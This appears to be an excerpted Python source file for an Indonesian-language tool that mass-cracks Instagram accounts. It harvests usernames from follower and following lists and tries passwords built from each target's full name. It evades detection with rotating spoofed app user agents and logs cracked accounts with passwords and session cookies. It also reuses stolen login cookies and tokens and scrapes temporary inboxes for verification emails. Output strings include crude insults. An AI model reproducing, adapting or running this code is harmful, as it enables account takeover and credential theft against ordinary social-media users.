...
import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string, platform,webbrowser,sys
...
B = "\033[1;94m" # BIRU
U = "\033[1;95m" # UNGU
B1 = "\033[1;96m" # BIRU MUDA
A = "\033[00m" # ABU ABU
B8 = "\033[3;96m" #Warna cantik
G = "\033[1;92m"
...
class MAIN:
   ...
   def zul(self, Text, chos=None):
       self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',Text_align='center',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))
   ...
   def MyRic(self, Text, chos=None):
       ...
       if result[0] == None:
           ...
           self.zul("[green]<[/][yellow]<[/][red]<[/] Wait Sebentar Sedang Login [red]>[/][yellow]>[/][green]>[/]")
           print("License Kadaluarsa Status: {0}".format(result[1]))
           os.system("xdg-open t.me/rolandino28")
           webbrowser.open("t.me/MrxMilzx")
           time.sleep(0.3)
           exit("See You Ngentot !")
       else:
           # everything went fine if we are here!
           self.zul("[green]<[/][yellow]<[/][red]<[/] Wait Sebentar Sedang Login [red]>[/][yellow]>[/][green]>[/]")
           time.sleep(1)
           uwu(f"{P}License {H}Valid {P}!!")
           license_key = result[0]
           print("STATUS : " + str(license_key.f8))
...
█▀▄ █▄█ █▄▄ █▀█ █░▀█ █▄▀ █ █░▀█ █▄█''')
   def find_res(self, meki=[]):
       ...
       for a in open(f'{self.name}','r').read().splitlines():
       ...
       if len(meki) == 0:
          ...
          for memek in meki:
              try:
                  ...
                  open('IG-login.txt','w').write(f'{memek}')
   ...
   def insta(self):
       ...
       self.MyRich(f'''[white]
   USERNAME AKUN   : {self.usr}
   NAMA AKUN       : {self.nama}
   FOLLOWERS AKUN  : {self.fol}
   ID AKUN         : {self.ds_user} \n''',None,'> [white]DETAIL USER[/] <')
       self.MyRich(''' [white]01. MULAI CRACK DARI FOLLOWERS
 02. MULAI CRACK DARI FOLLOWING     
 03. HASIL CHECKPOINT   
 04. HASIL SUCCESS       
 05. SIMPAN HASIL CRACK''',True)
       self.chs(self.aset)
   ...
   def chs(self, assets):
       while True:
         ...
         elif x in ['09','9']:exit(os.system('xdg-open https://wa.me/+6281243587205?text='))
         elif x in ['10']:os.system('rm -rf IG-login.txt');self.insta()
         elif x in ['12']:
            #   exit('\nFiture Akan Tersedia Dalam Beberapa H/M')
              if os.path.isfile('FB-login.txt') is False:
...
\n\tSalin Text Di Atas Untuk Mempercepat!'))
                 ...
                 try:
                     self.cokie, self.token = open('FB-login.txt','r').read().split('|')
   ...
   def CariNama(self, Items, Fil):
       self.MyRich(f'[white]Proses Sedang Di Mulai! Email Yang Tersedia Akun [Tiktok,Facebook,Instagram,Twitter] Akan Di Simpan Di Dalam Folder [green]email/Email-{datenow}[/] Nikamati Semua Fiture Yang Saya Berikan:)')
       self.bef = []
       print('')
                ...
                if str(filters) == 'ls':
                   if 'instagram' in str(self.sender[0].lower()) or 'facebook' in str(self.sender[0].lower()) or 'instagram' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          ...
                          open(f'email/EmailAcak-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                   else: Los +=1
                elif filters == 'ig':
                    if 'instagram' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'email/EmailInstagram-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                    ...
                    if 'tiktok' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'email/EmailTiktok-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tw':
                    if 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'email/EmailTwitter-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'fb':
                    if 'facebook' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'email/EmailFacebook-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
 ...
 05. Crack Dari Random Email    10. Kembali''',True)
       while True:
          ...
          elif x in ['09','9']:os.system('rm -rfFB-login.txt');self.insta()
 ...
 07. Set Tema Default',True)
   ...
   def save_sd(self, col = []):
       try:
           ...
           if self.name in ('all','All'):
              for self.xyz in col:
                  os.system(f'cp {self.xyz} /sdcard')
              exit('\nDone')
           else:
              os.system(f'cp {self.name} /sdcard')
              exit('\nDone')
       except Exception as e:exit(e)
   ...
   def Unli(self, cokie):
       if 'csrftoken' not in str(cokie['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/shared_', cookies = cokie).json()
       ...
       if len(un) > 0:
          self.MyRich('[white]Matikan wifi jika anda ingin stop dump!. jangan gunakan [red]CTRL + C[/]')
   ...
   def igrst(self):
       ...
       for self.name in self.dirs:
           if '-' not in self.name or 'login' in self.name:pass
                ...
                self.index+=1
                print(' %s. %s'%(self.index, self.name))
       print('')
       self.MyRich('\
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
   ...
   def Ulang(self):
       try:
          ...
          for rest in open(f'{file}','r').read().splitlines():
   ...
   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/shared_', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
...
02. Sandi Full Name 1-6  04. Sandi Full Name 1-5 + Manual',True)
       ...
       self.MyRic(f'\
[white]Akun OK Di Simpan Di Folder : OK-Instagram-{file_ok}\n\
Akun CP Di Simpan Di Folder : CP-Instagram-{file_ok}\n\
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def AppUac(self, GoblokLu=None):
        ...
        return(random.choice([
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Google; Pixel 8; GVU24; Tensor G3; en_GB; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Xiaomi; Mi 13 Pro; K60U; Dimensity 9200+; es_ES; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; OnePlus; OnePlus 11; CPH2541; Snapdragon 8 Gen 3; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Oppo; Oppo Find X6 Pro; CPH2523; Dimensity 9300; en_GB; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Vivo; Vivo X90 Pro; V2309A; Dimensity 9300; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Honor; Honor Magic 5 Pro; PGT-AN25; Snapdragon 8 Gen 3; ru_RU; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; ZTE; ZTE Axon 20 Ultra; ZTE-A009; Snapdragon 8 Gen 3; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Huawei; Huawei Mate 50 Pro; NOVA11PRO; Kirin 9000S; zh_CN; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Samsung; Galaxy Z Fold 5; SM-F946B; Snapdragon 8 Gen 2 for Galaxy; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Lenovo; Legion Y90; L71191; Snapdragon 8 Gen 2; fr_FR; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Nokia; Nokia X30 5G; TA-1600; Dimensity 9200; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Motorola; Moto Razr 2024; XT2341-1; Snapdragon 8 Gen 3; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Fairphone; Fairphone 5 Pro; FP5P; Snapdragon 8 Gen 3; nl_NL; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.Andr}; {self.dpi}; {self.pxl}; Tecno; Tecno Phantom X2; C21U; Dimensity 8200+; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Poco; Poco F5 GT; M13G; Snapdragon 8 Gen 2; es_ES; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Infinix; Infinix Zero Ultra; X6732; Dimensity 8020+; pt_BR; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Nothing; Nothing Phone 2; A070; Snapdragon 8+ Gen 2; en_GB; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Vivo; Vivo iQOO 11 Pro; V2230; Dimensity 9200+; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Huawei; MatePad 12 Pro; WGR-W10; Snapdragon 8 Gen 3; zh_CN; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Sony; Sony Xperia 5 IV; XQ-DC75; Snapdragon 695; ja_JP; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; ASUS; ASUS ROG Phone 7; AI2203; Snapdragon 8 Gen 3; en_US; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Honor; Honor 80; RMO-LX5; Snapdragon 695; en_IN; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; Lenovo; ThinkPad X1 Carbon; TPX001; Snapdragon 8 Gen 3; en_US; {self.kode})'
   ...
   def Dikabaik(self, GoblokLu=None):
       ...
       self.ua_list = [
            f'Pixel {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Pixel; GVU24; Tensor G3; en_GB; {self.kode})',
            f'Samsung {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Samsung; Galaxy S23; SM-S911B; Snapdragon 8 Gen 2 for Galaxy; en_US; {self.kode})',
            f'OnePlus {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OnePlus; 12; CPH2541; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Xiaomi {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Xiaomi; Redmi K60 Ultra; K60U; Dimensity 9200+; es_ES; {self.kode})',
            f'Oppo {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Oppo; Reno 10 Pro+; CPH2523; Dimensity 9300; en_GB; {self.kode})',
            f'Huawei {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Huawei; Nova 11 Pro; NOVA11PRO; Kirin 9000S; zh_CN; {self.kode})',
            f'Lenovo {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Lenovo; Legion Y90 Pro; L71191; Snapdragon 8 Gen 2; fr_FR; {self.kode})',
            f'Motorola {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Motorola; Razr 2024; XT2341-1; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Honor {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Honor; Magic 6 Pro+; PGT-AN25; Snapdragon 8 Gen 3; ru_RU; {self.kode})',
            f'ZTE {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ZTE; Axon 60 Ultra; ZTE-A009; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Vivo {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; X100 Pro+; V2309A; Dimensity 9300; en_US; {self.kode})',
            f'Sony {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Sony; Xperia 10 VI; XQ-DC75; Snapdragon 695; ja_JP; {self.kode})',
            f'ASUS {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ASUS; Zenfone 10; AI2203; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Fairphone {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Fairphone; Fairphone 5 Pro+; FP5P; Snapdragon 8 Gen 3; nl_NL; {self.kode})',
            f'Tecno {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Tecno; Camon 21 Ultra; C21U; Dimensity 8200+; en_US; {self.kode})',
            f'Nothing {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Nothing; Phone 4; A070; Snapdragon 8+ Gen 2; en_GB; {self.kode})',
            f'Infinix {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Infinix; Zero 40 Ultra; X6732; Dimensity 8020+; pt_BR; {self.kode})',
            f'Vivo {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; iQOO Z8 Pro; V2230; Dimensity 9200+; in_ID; {self.kode})'
        ]
       self.dikaa_list = [
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Google; Pixel 9 Pro; GPX35; Tensor G4; en_GB; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Xiaomi; Redmi K70 Pro; K70P; Snapdragon 8 Gen 3; zh_CN; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Samsung; Galaxy S24 Ultra; SM-S928B; Snapdragon 8 Gen 3 for Galaxy; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; X100 Pro+; V2310A; Snapdragon 8 Gen 3; en_IN; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Oppo; Find X7 Pro; OP7003; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Realme; GT6 Pro; RMX4023; Snapdragon 8 Gen 3; en_IN; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OnePlus; 13 Pro; CPH3021; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ASUS; ROG Phone 9 Ultimate; AI2405; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Motorola; Edge 50 Ultra; XT2401-6; Snapdragon 8 Gen 3; es_ES; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Sony; Xperia 2 Pro; XQ-DC82; Snapdragon 8 Gen 3; ja_JP; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Nokia; Magic Max 5G; TA-1600; Snapdragon 8 Gen 3; in_ID; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; LG; Wing 2 Pro; LM-G920; Snapdragon 8 Gen 3; ko_KR; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Huawei; Mate 70 Pro+; ALN-AL20; Kirin 9100S; zh_CN; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Lenovo; Legion Y100 Pro; L81191; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Tecno; Phantom V2 Pro; PHV02; Dimensity 9200+; fr_FR; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Infinix; Zero Ultra 6G; X7820; Dimensity 9200; pt_BR; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ZTE; Nubia Z70 Ultra; NX913J; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Poco; F6 GT; 24101330C; Snapdragon 8 Gen 3; es_ES; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Honor; Magic 7 Pro; PGT-AN30; Snapdragon 8 Gen 3; en_GB; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Meizu; 21 Infinity; M498Q; Snapdragon 8 Gen 3; zh_CN; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Nothing; Phone 4; A077; Snapdragon 8+ Gen 3; en_US; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Fairphone; Fairphone 6 Pro; FP6P; Snapdragon 8 Gen 2; nl_NL; {self.kode})',
            f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; iQOO 13 Pro; V2344A; Snapdragon 8 Gen 3; en_IN; {self.kode})'
        ]
       self.ua_list2 = [
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Google; Pixel 8; GVU24; Tensor G3; en_GB; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Xiaomi; Mi 13 Pro; K60U; Dimensity 9200+; es_ES; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OnePlus; OnePlus 11; CPH2541; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Oppo; Oppo Find X6 Pro; CPH2523; Dimensity 9300; en_GB; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; Vivo X90 Pro; V2309A; Dimensity 9300; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Honor; Honor Magic 5 Pro; PGT-AN25; Snapdragon 8 Gen 3; ru_RU; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ZTE; ZTE Axon 20 Ultra; ZTE-A009; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Huawei; Huawei Mate 50 Pro; NOVA11PRO; Kirin 9000S; zh_CN; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Samsung; Galaxy Z Fold 5; SM-F946B; Snapdragon 8 Gen 2 for Galaxy; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Lenovo; Legion Y90; L71191; Snapdragon 8 Gen 2; fr_FR; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Nokia; Nokia X30 5G; TA-1600; Dimensity 9200; in_ID; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Motorola; Moto Razr 2024; XT2341-1; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Fairphone; Fairphone 5 Pro; FP5P; Snapdragon 8 Gen 3; nl_NL; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Tecno; Tecno Phantom X2; C21U; Dimensity 8200+; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Poco; Poco F5 GT; M13G; Snapdragon 8 Gen 2; es_ES; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Infinix; Infinix Zero Ultra; X6732; Dimensity 8020+; pt_BR; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Nothing; Nothing Phone 2; A070; Snapdragon 8+ Gen 2; en_GB; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Vivo; Vivo iQOO 11 Pro; V2230; Dimensity 9200+; in_ID; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Huawei; MatePad 12 Pro; WGR-W10; Snapdragon 8 Gen 3; zh_CN; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Sony; Sony Xperia 5 IV; XQ-DC75; Snapdragon 695; ja_JP; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; ASUS; ASUS ROG Phone 7; AI2203; Snapdragon 8 Gen 3; en_US; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Honor; Honor 80; RMO-LX5; Snapdragon 695; en_IN; {self.kode})',
            f'Barcelona {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; Lenovo; ThinkPad X1 Carbon; TPX001; Snapdragon 8 Gen 3; en_US; {self.kode})'
        ]
       return random.choice([self.ua_list, self.ua_list2, self.dikaa_list])
 ...
 {P}Cookie       : {H}{cookie}                                               ''')
                       ...
                       self.pem = None
                       self.PWX = pwb
                    open('OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
 ...
 {P}Data Profile : {K2}{followers}/{following}/{postingan}                                  ''')
                    open('CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
 ...
 {P}Data Profile : {K2}{followers}/{following}/{postingan}                             ''')
   ...
   def get_code(self, cokie, response):
    ...
    'viewport-width': '980',})
           reqs = requests.post('https://www.threads.net/login', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None
   ...
   def GetingCode(self, coki):
       with requests.Session() as r:
         try:
              ...
              open('FB-login.txt','w').write(self.rt)
              return self.r4
         except (KeyError, Exception):
              return True
